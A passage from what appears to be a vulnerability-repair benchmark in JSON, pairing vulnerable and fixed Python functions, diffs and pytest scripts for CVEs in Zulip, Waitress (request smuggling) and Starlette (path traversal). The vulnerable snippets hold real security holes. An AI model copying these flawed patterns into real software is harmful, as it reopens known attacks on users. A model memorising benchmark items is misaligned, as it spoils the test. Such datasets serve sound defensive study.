current_setting_api_value, new_setting_value, expected_current_setting_value\n        ):\n            if (\n                setting_name in Stream.stream_permission_group_settings_requiring_content_access\n                and not user_has_content_access(\n                    user_profile,\n                    stream,\n                    user_group_membership_details,\n                    is_subscribed=sub is not None,\n                )\n            ):\n                raise JsonableError(_(\"Channel content access is required.\"))\n\n            with transaction.atomic(durable=True):\n                user_group_api_value_for_setting = access_user_group_api_value_for_setting(\n                    new_setting_value,\n                    user_profile,\n                    setting_name=setting_name,\n                    permission_configuration=permission_configuration,\n                )\n                do_change_stream_group_based_setting(\n                    stream,\n                    setting_name,\n                    new_setting_value=user_group_api_value_for_setting,\n                    old_setting_api_value=current_setting_api_value,\n                    acting_user=user_profile,\n                )\n\n    return json_success(request)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_75_1",
        "commit": "d2ff4bd",
        "file_path": "zerver/views/streams.py",
        "start_line": "259",
        "end_line": "462",
        "snippet": "def update_stream_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    *,\n    stream_id: PathOnly[int],\n    description: Annotated[str, StringConstraints(max_length=Stream.MAX_DESCRIPTION_LENGTH)]\n    | None = None,\n    is_private: Json[bool] | None = None,\n    is_default_stream: Json[bool] | None = None,\n    history_public_to_subscribers: Json[bool] | None = None,\n    is_web_public: Json[bool] | None = None,\n    new_name: str | None = None,\n    message_retention_days: Json[str] | Json[int] | None = None,\n    can_add_subscribers_group: Json[GroupSettingChangeRequest] | None = None,\n    can_administer_channel_group: Json[GroupSettingChangeRequest] | None = None,\n    can_send_message_group: Json[GroupSettingChangeRequest] | None = None,\n    can_remove_subscribers_group: Json[GroupSettingChangeRequest] | None = None,\n    can_subscribe_group: Json[GroupSettingChangeRequest] | None = None,\n) -> HttpResponse:\n    # Most settings updates only require metadata access, not content\n    # access. We will check for content access further when and where\n    # required.\n    (stream, sub) = access_stream_for_delete_or_update_requiring_metadata_access(\n        user_profile, stream_id\n    )\n    user_group_membership_details = UserGroupMembershipDetails(user_recursive_group_ids=None)\n\n    # Validate that the proposed state for permissions settings is permitted.\n    if is_private is not None:\n        proposed_is_private = is_private\n    else:\n        proposed_is_private = stream.invite_only\n\n    if is_web_public is not None:\n        proposed_is_web_public = is_web_public\n    else:\n        proposed_is_web_public = stream.is_web_public\n\n    if is_default_stream is not None:\n        proposed_is_default_stream = is_default_stream\n    else:\n        default_stream_ids = get_default_stream_ids_for_realm(stream.realm_id)\n        proposed_is_default_stream = stream.id in default_stream_ids\n\n    if stream.realm.is_zephyr_mirror_realm:\n        # In the Zephyr mirroring model, history is unconditionally\n        # not public to subscribers, even for public streams.\n        proposed_history_public_to_subscribers = False\n    elif history_public_to_subscribers is not None:\n        proposed_history_public_to_subscribers = history_public_to_subscribers\n    elif is_private is not None:\n        # By default, private streams have protected history while for\n        # public streams history is public by default.\n        proposed_history_public_to_subscribers = not is_private\n    else:\n        proposed_history_public_to_subscribers = stream.history_public_to_subscribers\n\n    # Web-public streams must have subscriber-public history.\n    if proposed_is_web_public and not proposed_history_public_to_subscribers:\n        raise JsonableError(_(\"Invalid parameters\"))\n\n    # Web-public streams must not be private.\n    if proposed_is_web_public and proposed_is_private:\n        raise JsonableError(_(\"Invalid parameters\"))\n\n    # Public streams must be public to subscribers.\n    if not proposed_is_private and not proposed_history_public_to_subscribers:\n        if stream.realm.is_zephyr_mirror_realm:\n            # All Zephyr realm streams violate this rule.\n            pass\n        else:\n            raise JsonableError(_(\"Invalid parameters\"))\n\n    # Ensure that a stream cannot be both a default stream for new users and private\n    if proposed_is_private and proposed_is_default_stream:\n        raise JsonableError(_(\"A default channel cannot be private.\"))\n\n    # Ensure that a moderation request channel isn't set to public.\n    if not proposed_is_private and user_profile.realm.moderation_request_channel == stream:\n        raise JsonableError(_(\"Moderation request channel must be private.\"))\n\n    if is_private is not None and not user_has_content_access(\n        user_profile,\n        stream,\n        user_group_membership_details,\n        is_subscribed=sub is not None,\n    ):\n        raise JsonableError(_(\"Channel content access is required.\"))\n        # In addition to channel administration permissions, changing\n        # public/private status for channels requires content access\n        # to the channel.\n\n    if is_private is not None:\n        if is_private and not user_profile.can_create_private_streams():\n            raise JsonableError(_(\"Insufficient permission\"))\n\n        if not is_private and not user_profile.can_create_public_streams():\n            raise JsonableError(_(\"Insufficient permission\"))\n\n    # Enforce restrictions on creating web-public streams. Since these\n    # checks are only required when changing a stream to be\n    # web-public, we don't use an \"is not None\" check.\n    if is_web_public:\n        if not user_profile.realm.web_public_streams_enabled():\n            raise JsonableError(_(\"Web-public channels are not enabled.\"))\n        if not user_profile.can_create_web_public_streams():\n            raise JsonableError(_(\"Insufficient permission\"))\n\n    if (\n        is_private is not None\n        or is_web_public is not None\n        or history_public_to_subscribers is not None\n    ):\n        do_change_stream_permission(\n            stream,\n            invite_only=proposed_is_private,\n            history_public_to_subscribers=proposed_history_public_to_subscribers,\n            is_web_public=proposed_is_web_public,\n            acting_user=user_profile,\n        )\n\n    if is_default_stream is not None:\n        if not user_profile.can_manage_default_streams():\n            raise CannotManageDefaultChannelError\n        if is_default_stream:\n            do_add_default_stream(stream)\n        else:\n            do_remove_default_stream(stream)\n\n    if message_retention_days is not None:\n        if not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequiredError\n        user_profile.realm.ensure_not_on_limited_plan()\n        new_message_retention_days_value = parse_message_retention_days(\n            message_retention_days, Stream.MESSAGE_RETENTION_SPECIAL_VALUES_MAP\n        )\n        do_change_stream_message_retention_days(\n            stream, user_profile, new_message_retention_days_value\n        )\n\n    if description is not None:\n        if \"\\n\" in description:\n            # We don't allow newline characters in stream descriptions.\n            description = description.replace(\"\\n\", \" \")\n        do_change_stream_description(stream, description, acting_user=user_profile)\n    if new_name is not None:\n        new_name = new_name.strip()\n        if stream.name == new_name:\n            raise JsonableError(_(\"Channel already has that name.\"))\n        if stream.name.lower() != new_name.lower():\n            # Check that the stream name is available (unless we are\n            # are only changing the casing of the stream name).\n            check_stream_name_available(user_profile.realm, new_name)\n        do_rename_stream(stream, new_name, user_profile)\n\n    nobody_group = get_system_user_group_by_name(SystemGroups.NOBODY, user_profile.realm_id)\n    request_settings_dict = locals()\n    for setting_name, permission_configuration in Stream.stream_permission_group_settings.items():\n        assert setting_name in request_settings_dict\n        if request_settings_dict[setting_name] is None:\n            continue\n\n        setting_value = request_settings_dict[setting_name]\n        new_setting_value = parse_group_setting_value(setting_value.new, nobody_group)\n\n        expected_current_setting_value = None\n        if setting_value.old is not None:\n            expected_current_setting_value = parse_group_setting_value(\n                setting_value.old, nobody_group\n            )\n\n        current_value = getattr(stream, setting_name)\n        current_setting_api_value = get_group_setting_value_for_api(current_value)\n\n        if validate_group_setting_value_change(\n            current_setting_api_value, new_setting_value, expected_current_setting_value\n        ):\n            if (\n                setting_name in Stream.stream_permission_group_settings_requiring_content_access\n                and not user_has_content_access(\n                    user_profile,\n                    stream,\n                    user_group_membership_details,\n                    is_subscribed=sub is not None,\n                )\n            ):\n                raise JsonableError(_(\"Channel content access is required.\"))\n\n            with transaction.atomic(durable=True):\n                user_group_api_value_for_setting = access_user_group_api_value_for_setting(\n                    new_setting_value,\n                    user_profile,\n                    setting_name=setting_name,\n                    permission_configuration=permission_configuration,\n                )\n                do_change_stream_group_based_setting(\n                    stream,\n                    setting_name,\n                    new_setting_value=user_group_api_value_for_setting,\n                    old_setting_api_value=current_setting_api_value,\n                    acting_user=user_profile,\n                )\n\n    return json_success(request)"
      }
    ],
    "vul_patch": "--- a/zerver/views/streams.py\n+++ b/zerver/views/streams.py\n@@ -90,6 +90,13 @@\n         # public/private status for channels requires content access\n         # to the channel.\n \n+    if is_private is not None:\n+        if is_private and not user_profile.can_create_private_streams():\n+            raise JsonableError(_(\"Insufficient permission\"))\n+\n+        if not is_private and not user_profile.can_create_public_streams():\n+            raise JsonableError(_(\"Insufficient permission\"))\n+\n     # Enforce restrictions on creating web-public streams. Since these\n     # checks are only required when changing a stream to be\n     # web-public, we don't use an \"is not None\" check.\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-16792",
    "cve_description": "Waitress through version 1.3.1 allows request smuggling by sending the Content-Length header twice. Waitress would header fold a double Content-Length header and due to being unable to cast the now comma separated value to an integer would set the Content-Length to 0 internally. If two Content-Length headers are sent in a single request, Waitress would treat the request as having no body, thereby treating the body of the request as a new request in HTTP pipelining. This issue is fixed in Waitress 1.4.0.",
    "cwe_info": {
      "CWE-444": {
        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
        "description": "The product acts as an intermediary HTTP agent\n         (such as a proxy or firewall) in the data flow between two\n         entities such as a client and server, but it does not\n         interpret malformed HTTP requests or responses in ways that\n         are consistent with how the messages will be processed by\n         those entities that are at the ultimate destination."
      }
    },
    "repo": "https://github.com/Pylons/waitress",
    "patch_url": [
      "https://github.com/Pylons/waitress/commit/575994cd42e83fd772a5f7ec98b2c56751bd3f65"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_73_1",
        "commit": "804e313",
        "file_path": "waitress/parser.py",
        "start_line": "176",
        "end_line": "261",
        "snippet": "    def parse_header(self, header_plus):\n        \"\"\"\n        Parses the header_plus block of text (the headers plus the\n        first line of the request).\n        \"\"\"\n        index = header_plus.find(b\"\\r\\n\")\n        if index >= 0:\n            first_line = header_plus[:index].rstrip()\n            header = header_plus[index + 2 :]\n        else:\n            raise ParsingError(\"HTTP message header invalid\")\n\n        if b\"\\r\" in first_line or b\"\\n\" in first_line:\n            raise ParsingError(\"Bare CR or LF found in HTTP message\")\n\n        self.first_line = first_line  # for testing\n\n        lines = get_header_lines(header)\n\n        headers = self.headers\n        for line in lines:\n            index = line.find(b\":\")\n            if index > 0:\n                key = line[:index]\n\n                if key != key.strip():\n                    raise ParsingError(\"Invalid whitespace after field-name\")\n\n                if b\"_\" in key:\n                    continue\n                value = line[index + 1 :].strip()\n                key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n                # If a header already exists, we append subsequent values\n                # seperated by a comma. Applications already need to handle\n                # the comma seperated values, as HTTP front ends might do\n                # the concatenation for you (behavior specified in RFC2616).\n                try:\n                    headers[key1] += tostr(b\", \" + value)\n                except KeyError:\n                    headers[key1] = tostr(value)\n            # else there's garbage in the headers?\n\n        # command, uri, version will be bytes\n        command, uri, version = crack_first_line(first_line)\n        version = tostr(version)\n        command = tostr(command)\n        self.command = command\n        self.version = version\n        (\n            self.proxy_scheme,\n            self.proxy_netloc,\n            self.path,\n            self.query,\n            self.fragment,\n        ) = split_uri(uri)\n        self.url_scheme = self.adj.url_scheme\n        connection = headers.get(\"CONNECTION\", \"\")\n\n        if version == \"1.0\":\n            if connection.lower() != \"keep-alive\":\n                self.connection_close = True\n\n        if version == \"1.1\":\n            # since the server buffers data from chunked transfers and clients\n            # never need to deal with chunked requests, downstream clients\n            # should not see the HTTP_TRANSFER_ENCODING header; we pop it\n            # here\n            te = headers.pop(\"TRANSFER_ENCODING\", \"\")\n            if te.lower() == \"chunked\":\n                self.chunked = True\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = ChunkedReceiver(buf)\n            expect = headers.get(\"EXPECT\", \"\").lower()\n            self.expect_continue = expect == \"100-continue\"\n            if connection.lower() == \"close\":\n                self.connection_close = True\n\n        if not self.chunked:\n            try:\n                cl = int(headers.get(\"CONTENT_LENGTH\", 0))\n            except ValueError:\n                cl = 0\n            self.content_length = cl\n            if cl > 0:\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = FixedStreamReceiver(cl, buf)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_73_1",
        "commit": "575994c",
        "file_path": "waitress/parser.py",
        "start_line": "176",
        "end_line": "262",
        "snippet": "    def parse_header(self, header_plus):\n        \"\"\"\n        Parses the header_plus block of text (the headers plus the\n        first line of the request).\n        \"\"\"\n        index = header_plus.find(b\"\\r\\n\")\n        if index >= 0:\n            first_line = header_plus[:index].rstrip()\n            header = header_plus[index + 2 :]\n        else:\n            raise ParsingError(\"HTTP message header invalid\")\n\n        if b\"\\r\" in first_line or b\"\\n\" in first_line:\n            raise ParsingError(\"Bare CR or LF found in HTTP message\")\n\n        self.first_line = first_line  # for testing\n\n        lines = get_header_lines(header)\n\n        headers = self.headers\n        for line in lines:\n            index = line.find(b\":\")\n            if index > 0:\n                key = line[:index]\n\n                if key != key.strip():\n                    raise ParsingError(\"Invalid whitespace after field-name\")\n\n                if b\"_\" in key:\n                    continue\n                value = line[index + 1 :].strip()\n                key1 = tostr(key.upper().replace(b\"-\", b\"_\"))\n                # If a header already exists, we append subsequent values\n                # seperated by a comma. Applications already need to handle\n                # the comma seperated values, as HTTP front ends might do\n                # the concatenation for you (behavior specified in RFC2616).\n                try:\n                    headers[key1] += tostr(b\", \" + value)\n                except KeyError:\n                    headers[key1] = tostr(value)\n            # else there's garbage in the headers?\n\n        # command, uri, version will be bytes\n        command, uri, version = crack_first_line(first_line)\n        version = tostr(version)\n        command = tostr(command)\n        self.command = command\n        self.version = version\n        (\n            self.proxy_scheme,\n            self.proxy_netloc,\n            self.path,\n            self.query,\n            self.fragment,\n        ) = split_uri(uri)\n        self.url_scheme = self.adj.url_scheme\n        connection = headers.get(\"CONNECTION\", \"\")\n\n        if version == \"1.0\":\n            if connection.lower() != \"keep-alive\":\n                self.connection_close = True\n\n        if version == \"1.1\":\n            # since the server buffers data from chunked transfers and clients\n            # never need to deal with chunked requests, downstream clients\n            # should not see the HTTP_TRANSFER_ENCODING header; we pop it\n            # here\n            te = headers.pop(\"TRANSFER_ENCODING\", \"\")\n            if te.lower() == \"chunked\":\n                self.chunked = True\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = ChunkedReceiver(buf)\n            expect = headers.get(\"EXPECT\", \"\").lower()\n            self.expect_continue = expect == \"100-continue\"\n            if connection.lower() == \"close\":\n                self.connection_close = True\n\n        if not self.chunked:\n            try:\n                cl = int(headers.get(\"CONTENT_LENGTH\", 0))\n            except ValueError:\n                raise ParsingError(\"Content-Length is invalid\")\n\n            self.content_length = cl\n            if cl > 0:\n                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n                self.body_rcv = FixedStreamReceiver(cl, buf)"
      }
    ],
    "vul_patch": "--- a/waitress/parser.py\n+++ b/waitress/parser.py\n@@ -79,7 +79,8 @@\n             try:\n                 cl = int(headers.get(\"CONTENT_LENGTH\", 0))\n             except ValueError:\n-                cl = 0\n+                raise ParsingError(\"Content-Length is invalid\")\n+\n             self.content_length = cl\n             if cl > 0:\n                 buf = OverflowableBuffer(self.adj.inbuf_overflow)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-29159",
    "cve_description": "Directory traversal vulnerability in Starlette versions 0.13.5 and later and prior to 0.27.0 allows a remote unauthenticated attacker to view files in a web service which was built using Starlette.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/encode/starlette",
    "patch_url": [
      "https://github.com/encode/starlette/commit/1797de464124b090f10cf570441e8292936d63e3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_58_1",
        "commit": "24c1fac",
        "file_path": "starlette/staticfiles.py",
        "start_line": 162,
        "end_line": 180,
        "snippet": "    def lookup_path(\n        self, path: str\n    ) -> typing.Tuple[str, typing.Optional[os.stat_result]]:\n        for directory in self.all_directories:\n            joined_path = os.path.join(directory, path)\n            if self.follow_symlink:\n                full_path = os.path.abspath(joined_path)\n            else:\n                full_path = os.path.realpath(joined_path)\n            directory = os.path.realpath(directory)\n            if os.path.commonprefix([full_path, directory]) != directory:\n                # Don't allow misbehaving clients to break out of the static files\n                # directory.\n                continue\n            try:\n                return full_path, os.stat(full_path)\n            except (FileNotFoundError, NotADirectoryError):\n                continue\n        return \"\", None"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_58_1",
        "commit": "1797de4",
        "file_path": "starlette/staticfiles.py",
        "start_line": 162,
        "end_line": 180,
        "snippet": "    def lookup_path(\n        self, path: str\n    ) -> typing.Tuple[str, typing.Optional[os.stat_result]]:\n        for directory in self.all_directories:\n            joined_path = os.path.join(directory, path)\n            if self.follow_symlink:\n                full_path = os.path.abspath(joined_path)\n            else:\n                full_path = os.path.realpath(joined_path)\n            directory = os.path.realpath(directory)\n            if os.path.commonpath([full_path, directory]) != directory:\n                # Don't allow misbehaving clients to break out of the static files\n                # directory.\n                continue\n            try:\n                return full_path, os.stat(full_path)\n            except (FileNotFoundError, NotADirectoryError):\n                continue\n        return \"\", None"
      }
    ],
    "vul_patch": "--- a/starlette/staticfiles.py\n+++ b/starlette/staticfiles.py\n@@ -8,7 +8,7 @@\n             else:\n                 full_path = os.path.realpath(joined_path)\n             directory = os.path.realpath(directory)\n-            if os.path.commonprefix([full_path, directory]) != directory:\n+            if os.path.commonpath([full_path, directory]) != directory:\n                 # Don't allow misbehaving clients to break out of the static files\n                 # directory.\n                 continue\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-29159:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/starlette\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-29159/bin/python -m pytest tests/test_staticfiles.py::test_staticfiles_avoids_path_traversal tests/test_staticfiles.py::test_staticfiles_with_pathlib\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-29159:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/starlette\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-29159/bin/python -m pytest tests/test_staticfiles.py -v -k \"not test_staticfiles_with_invalid_dir_permissions_returns_401\" \n"
  },
  {
    "cve_id": "CVE-2017-0910",
    "cve_description": "In Zulip Server before 1.7.1, on a server with multiple realms, a vulnerability in the invitation system lets an authorized user of one realm on the server create a user account on any other realm.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/960d736e55cbb9386a68e4ee45f80581fd2a4e32"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_362_1",
        "commit": "28a3dcf787b489d155bd27765f1aed5e7a1f44a9",
        "file_path": "zerver/views/registration.py",
        "start_line": 70,
        "end_line": 283,
        "snippet": "def accounts_register(request):\n    # type: (HttpRequest) -> HttpResponse\n    key = request.POST['key']\n    confirmation = Confirmation.objects.get(confirmation_key=key)\n    prereg_user = confirmation.content_object\n    email = prereg_user.email\n    realm_creation = prereg_user.realm_creation\n    password_required = prereg_user.password_required\n\n    validators.validate_email(email)\n    if realm_creation:\n        # For creating a new realm, there is no existing realm or domain\n        realm = None\n    else:\n        realm = get_realm(get_subdomain(request))\n        if prereg_user.realm is not None and prereg_user.realm != realm:\n            return render(request, 'confirmation/link_does_not_exist.html')\n\n    if realm and not email_allowed_for_realm(email, realm):\n        return render(request, \"zerver/closed_realm.html\",\n                      context={\"closed_domain_name\": realm.name})\n\n    if realm and realm.deactivated:\n        # The user is trying to register for a deactivated realm. Advise them to\n        # contact support.\n        return redirect_to_deactivation_notice()\n\n    try:\n        validate_email_for_realm(realm, email)\n    except ValidationError:\n        return HttpResponseRedirect(reverse('django.contrib.auth.views.login') + '?email=' +\n                                    urllib.parse.quote_plus(email))\n\n    name_validated = False\n    full_name = None\n\n    if request.POST.get('from_confirmation'):\n        try:\n            del request.session['authenticated_full_name']\n        except KeyError:\n            pass\n        if realm is not None and realm.is_zephyr_mirror_realm:\n            # For MIT users, we can get an authoritative name from Hesiod.\n            # Technically we should check that this is actually an MIT\n            # realm, but we can cross that bridge if we ever get a non-MIT\n            # zephyr mirroring realm.\n            hesiod_name = compute_mit_user_fullname(email)\n            form = RegistrationForm(\n                initial={'full_name': hesiod_name if \"@\" not in hesiod_name else \"\"},\n                realm_creation=realm_creation)\n            name_validated = True\n        elif settings.POPULATE_PROFILE_VIA_LDAP:\n            for backend in get_backends():\n                if isinstance(backend, LDAPBackend):\n                    ldap_attrs = _LDAPUser(backend, backend.django_to_ldap_username(email)).attrs\n                    try:\n                        ldap_full_name = ldap_attrs[settings.AUTH_LDAP_USER_ATTR_MAP['full_name']][0]\n                        request.session['authenticated_full_name'] = ldap_full_name\n                        name_validated = True\n                        # We don't use initial= here, because if the form is\n                        # complete (that is, no additional fields need to be\n                        # filled out by the user) we want the form to validate,\n                        # so they can be directly registered without having to\n                        # go through this interstitial.\n                        form = RegistrationForm({'full_name': ldap_full_name},\n                                                realm_creation=realm_creation)\n                        # FIXME: This will result in the user getting\n                        # validation errors if they have to enter a password.\n                        # Not relevant for ONLY_SSO, though.\n                        break\n                    except TypeError:\n                        # Let the user fill out a name and/or try another backend\n                        form = RegistrationForm(realm_creation=realm_creation)\n        elif 'full_name' in request.POST:\n            form = RegistrationForm(\n                initial={'full_name': request.POST.get('full_name')},\n                realm_creation=realm_creation\n            )\n        else:\n            form = RegistrationForm(realm_creation=realm_creation)\n    else:\n        postdata = request.POST.copy()\n        if name_changes_disabled(realm):\n            # If we populate profile information via LDAP and we have a\n            # verified name from you on file, use that. Otherwise, fall\n            # back to the full name in the request.\n            try:\n                postdata.update({'full_name': request.session['authenticated_full_name']})\n                name_validated = True\n            except KeyError:\n                pass\n        form = RegistrationForm(postdata, realm_creation=realm_creation)\n        if not (password_auth_enabled(realm) and password_required):\n            form['password'].field.required = False\n\n    if form.is_valid():\n        if password_auth_enabled(realm):\n            password = form.cleaned_data['password']\n        else:\n            # SSO users don't need no passwords\n            password = None\n\n        if realm_creation:\n            string_id = form.cleaned_data['realm_subdomain']\n            realm_name = form.cleaned_data['realm_name']\n            realm = do_create_realm(string_id, realm_name)\n            setup_initial_streams(realm)\n        assert(realm is not None)\n\n        full_name = form.cleaned_data['full_name']\n        short_name = email_to_username(email)\n\n        timezone = u\"\"\n        if 'timezone' in request.POST and request.POST['timezone'] in get_all_timezones():\n            timezone = request.POST['timezone']\n\n        try:\n            existing_user_profile = get_user_profile_by_email(email)\n        except UserProfile.DoesNotExist:\n            existing_user_profile = None\n\n        return_data = {}  # type: Dict[str, bool]\n        if ldap_auth_enabled(realm):\n            # If the user was authenticated using an external SSO\n            # mechanism like Google or GitHub auth, then authentication\n            # will have already been done before creating the\n            # PreregistrationUser object with password_required=False, and\n            # so we don't need to worry about passwords.\n            #\n            # If instead the realm is using EmailAuthBackend, we will\n            # set their password above.\n            #\n            # But if the realm is using LDAPAuthBackend, we need to verify\n            # their LDAP password (which will, as a side effect, create\n            # the user account) here using authenticate.\n            auth_result = authenticate(request,\n                                       username=email,\n                                       password=password,\n                                       realm_subdomain=realm.subdomain,\n                                       return_data=return_data)\n            if auth_result is None:\n                # TODO: This probably isn't going to give a\n                # user-friendly error message, but it doesn't\n                # particularly matter, because the registration form\n                # is hidden for most users.\n                return HttpResponseRedirect(reverse('django.contrib.auth.views.login') + '?email=' +\n                                            urllib.parse.quote_plus(email))\n\n            # Since we'll have created a user, we now just log them in.\n            return login_and_go_to_home(request, auth_result)\n        elif existing_user_profile is not None and existing_user_profile.is_mirror_dummy:\n            user_profile = existing_user_profile\n            do_activate_user(user_profile)\n            do_change_password(user_profile, password)\n            do_change_full_name(user_profile, full_name, user_profile)\n            do_set_user_display_setting(user_profile, 'timezone', timezone)\n        else:\n            user_profile = do_create_user(email, password, realm, full_name, short_name,\n                                          prereg_user=prereg_user, is_realm_admin=realm_creation,\n                                          tos_version=settings.TOS_VERSION,\n                                          timezone=timezone,\n                                          newsletter_data={\"IP\": request.META['REMOTE_ADDR']})\n\n        # Note: Any logic like this must also be replicated in\n        # ZulipLDAPAuthBackend and zerver/views/users.py.  This is\n        # ripe for a refactoring, though care is required to avoid\n        # import loops with zerver/lib/actions.py and zerver/lib/onboarding.py.\n        send_initial_pms(user_profile)\n\n        if realm_creation:\n            setup_initial_private_stream(user_profile)\n            send_initial_realm_messages(realm)\n\n        if realm_creation:\n            # Because for realm creation, registration happens on the\n            # root domain, we need to log them into the subdomain for\n            # their new realm.\n            return redirect_and_log_into_subdomain(realm, full_name, email)\n\n        # This dummy_backend check below confirms the user is\n        # authenticating to the correct subdomain.\n        auth_result = authenticate(username=user_profile.email,\n                                   realm_subdomain=realm.subdomain,\n                                   return_data=return_data,\n                                   use_dummy_backend=True)\n        if return_data.get('invalid_subdomain'):\n            # By construction, this should never happen.\n            logging.error(\"Subdomain mismatch in registration %s: %s\" % (\n                realm.subdomain, user_profile.email,))\n            return redirect('/')\n\n        return login_and_go_to_home(request, auth_result)\n\n    return render(\n        request,\n        'zerver/register.html',\n        context={'form': form,\n                 'email': email,\n                 'key': key,\n                 'full_name': request.session.get('authenticated_full_name', None),\n                 'lock_name': name_validated and name_changes_disabled(realm),\n                 # password_auth_enabled is normally set via our context processor,\n                 # but for the registration form, there is no logged in user yet, so\n                 # we have to set it here.\n                 'creating_new_team': realm_creation,\n                 'password_required': password_auth_enabled(realm) and password_required,\n                 'password_auth_enabled': password_auth_enabled(realm),\n                 'root_domain_available': is_root_domain_available(),\n                 'MAX_REALM_NAME_LENGTH': str(Realm.MAX_REALM_NAME_LENGTH),\n                 'MAX_NAME_LENGTH': str(UserProfile.MAX_NAME_LENGTH),\n                 'MAX_PASSWORD_LENGTH': str(form.MAX_PASSWORD_LENGTH),\n                 'MAX_REALM_SUBDOMAIN_LENGTH': str(Realm.MAX_REALM_SUBDOMAIN_LENGTH)\n                 }\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_362_1",
        "commit": "960d736e55cbb9386a68e4ee45f80581fd2a4e32",
        "file_path": "zerver/views/registration.py",
        "start_line": 70,
        "end_line": 285,
        "snippet": "def accounts_register(request):\n    # type: (HttpRequest) -> HttpResponse\n    key = request.POST['key']\n    confirmation = Confirmation.objects.get(confirmation_key=key)\n    prereg_user = confirmation.content_object\n    email = prereg_user.email\n    realm_creation = prereg_user.realm_creation\n    password_required = prereg_user.password_required\n\n    validators.validate_email(email)\n    if realm_creation:\n        # For creating a new realm, there is no existing realm or domain\n        realm = None\n    else:\n        realm = get_realm(get_subdomain(request))\n        if prereg_user.realm is None:\n            return render(request, 'confirmation/link_expired.html')\n        if prereg_user.realm != realm:\n            return render(request, 'confirmation/link_does_not_exist.html')\n\n    if realm and not email_allowed_for_realm(email, realm):\n        return render(request, \"zerver/closed_realm.html\",\n                      context={\"closed_domain_name\": realm.name})\n\n    if realm and realm.deactivated:\n        # The user is trying to register for a deactivated realm. Advise them to\n        # contact support.\n        return redirect_to_deactivation_notice()\n\n    try:\n        validate_email_for_realm(realm, email)\n    except ValidationError:\n        return HttpResponseRedirect(reverse('django.contrib.auth.views.login') + '?email=' +\n                                    urllib.parse.quote_plus(email))\n\n    name_validated = False\n    full_name = None\n\n    if request.POST.get('from_confirmation'):\n        try:\n            del request.session['authenticated_full_name']\n        except KeyError:\n            pass\n        if realm is not None and realm.is_zephyr_mirror_realm:\n            # For MIT users, we can get an authoritative name from Hesiod.\n            # Technically we should check that this is actually an MIT\n            # realm, but we can cross that bridge if we ever get a non-MIT\n            # zephyr mirroring realm.\n            hesiod_name = compute_mit_user_fullname(email)\n            form = RegistrationForm(\n                initial={'full_name': hesiod_name if \"@\" not in hesiod_name else \"\"},\n                realm_creation=realm_creation)\n            name_validated = True\n        elif settings.POPULATE_PROFILE_VIA_LDAP:\n            for backend in get_backends():\n                if isinstance(backend, LDAPBackend):\n                    ldap_attrs = _LDAPUser(backend, backend.django_to_ldap_username(email)).attrs\n                    try:\n                        ldap_full_name = ldap_attrs[settings.AUTH_LDAP_USER_ATTR_MAP['full_name']][0]\n                        request.session['authenticated_full_name'] = ldap_full_name\n                        name_validated = True\n                        # We don't use initial= here, because if the form is\n                        # complete (that is, no additional fields need to be\n                        # filled out by the user) we want the form to validate,\n                        # so they can be directly registered without having to\n                        # go through this interstitial.\n                        form = RegistrationForm({'full_name': ldap_full_name},\n                                                realm_creation=realm_creation)\n                        # FIXME: This will result in the user getting\n                        # validation errors if they have to enter a password.\n                        # Not relevant for ONLY_SSO, though.\n                        break\n                    except TypeError:\n                        # Let the user fill out a name and/or try another backend\n                        form = RegistrationForm(realm_creation=realm_creation)\n        elif 'full_name' in request.POST:\n            form = RegistrationForm(\n                initial={'full_name': request.POST.get('full_name')},\n                realm_creation=realm_creation\n            )\n        else:\n            form = RegistrationForm(realm_creation=realm_creation)\n    else:\n        postdata = request.POST.copy()\n        if name_changes_disabled(realm):\n            # If we populate profile information via LDAP and we have a\n            # verified name from you on file, use that. Otherwise, fall\n            # back to the full name in the request.\n            try:\n                postdata.update({'full_name': request.session['authenticated_full_name']})\n                name_validated = True\n            except KeyError:\n                pass\n        form = RegistrationForm(postdata, realm_creation=realm_creation)\n        if not (password_auth_enabled(realm) and password_required):\n            form['password'].field.required = False\n\n    if form.is_valid():\n        if password_auth_enabled(realm):\n            password = form.cleaned_data['password']\n        else:\n            # SSO users don't need no passwords\n            password = None\n\n        if realm_creation:\n            string_id = form.cleaned_data['realm_subdomain']\n            realm_name = form.cleaned_data['realm_name']\n            realm = do_create_realm(string_id, realm_name)\n            